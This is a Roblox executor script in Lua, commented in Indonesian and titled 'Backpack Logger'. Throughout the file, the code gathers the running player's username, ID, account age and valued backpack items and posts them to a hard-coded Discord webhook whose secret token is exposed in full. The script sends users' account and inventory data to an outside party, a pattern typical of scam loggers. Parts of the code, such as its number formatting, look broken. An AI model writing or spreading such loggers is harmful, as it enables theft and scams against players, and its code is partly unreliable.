local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local userId = player.UserId
local playerName = player.Name
local accountAge = player.AccountAge -- umur akun dalam hari
local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"

-- Kumpulkan isi backpack (format seperti di gambar)
local backpack = player:WaitForChild("Backpack")
local backpackItems = {}
for _, item in ipairs(backpack:GetChildren()) do
    -- Format: "Item Name [Weight] [Age] ‚Üí Value#"
    local weight = string.format("%.2f KG", item:GetAttribute("Weight") or 0)
    local age = item:GetAttribute("Age") or 1
    local value = item:GetAttribute("Value") or 0
    local formattedValue = string.format("%,d#", value)
    
    -- Handle special [Celestial] tag if present
    local itemName = item.Name
    if item:GetAttribute("IsCelestial") then
        itemName = "[Celestial] " .. itemName
    end
    
    table.insert(backpackItems, string.format("%s [%s] [Age %d] ‚Üí %s", 
        itemName, weight, age, formattedValue))
end

-- Urutkan berdasarkan nilai terbesar ke terkecil (seperti di gambar)
table.sort(backpackItems, function(a, b)
    local valueA = tonumber(string.match(a, "‚Üí ([%d,]+)#"):gsub(",", "")) or 0
    local valueB = tonumber(string.match(b, "‚Üí ([%d,]+)#"):gsub(",", "")) or 0
    return valueA > valueB
end)

-- Gabungkan dengan format baris baru
local backpackStr = #backpackItems > 0 and table.concat(backpackItems, "\n") or "Kosong"

-- Batasi panjang string agar tidak melebihi batas embed Discord (~4000 karakter)
local maxLength = 3000
if #backpackStr > maxLength then
    backpackStr = string.sub(backpackStr, 1, maxLength - 3) .. "..."
end

local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"

-- Pilih fungsi request sesuai executor
local requestFunction = nil

if type(http_request) == "function" then
    requestFunction = http_request
elseif type(request) == "function" then
    requestFunction = request
elseif syn and type(syn.request) == "function" then
    requestFunction = syn.request
elseif fluxus and type(fluxus.request) == "function" then
    requestFunction = fluxus.request
elseif krnl and type(krnl.request) == "function" then
    requestFunction = krnl.request
end

if typeof(requestFunction) ~= "function" then
    warn("‚ùå Executor tidak mendukung HTTP request.")
    return
end

local function safeRequest(options)
    local success, result = pcall(function()
        return requestFunction(options)
    end)
    if success then
        return result
    else
        warn("‚ùå Request error:", result)
        return nil
    end
end

-- Waktu ISO 8601 lengkap (tanggal + waktu)
local isoTimestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- UTC time

-- Buat payload embed webhook Discord
local webhookPayload = {
    ["username"] = "üéí Backpack Logger",
    ["avatar_url"] = "https://i.imgur.com/0y0F0Gj.png", -- Icon tas, bisa diganti
    ["embeds"] = {{
        ["title"] = "üì¶ Informasi Backpack dan Akun",
        ["color"] = 0x3498db, -- biru
        ["fields"] = {
            {
                ["name"] = "üë§ Player",
                ["value"] = string.format("`%s` (ID: `%d`)", playerName, userId),
                ["inline"] = true
            },
            {
                ["name"] = "‚è≥ Umur Akun",
                ["value"] = string.format("%d hari", accountAge),
                ["inline"] = true
            },
            {
                ["name"] = "üîó Profile Roblox",
                ["value"] = string.format("[Klik Disini](%s)", profileUrl),
                ["inline"] = false
            },
            {
                ["name"] = "üéí Isi Backpack",
                ["value"] = "```\n" .. backpackStr .. "\n```", -- Format sebagai code block
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
            ["icon_url"] = "https://i.imgur.com/Z4VbQXz.png"
        },
        ["timestamp"] = isoTimestamp
    }}
}

-- Kirim webhook ke Discord
local response = safeRequest({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(webhookPayload)
})

if response and (response.StatusCode == 204 or response.StatusCode == 200) then -- Discord webhook sukses (204 No Content atau 200 OK)
    print("‚úÖ Webhook Discord berhasil dikirim!")
else
    warn("‚ùå Gagal mengirim webhook:", response and response.StatusCode or "No response")
end
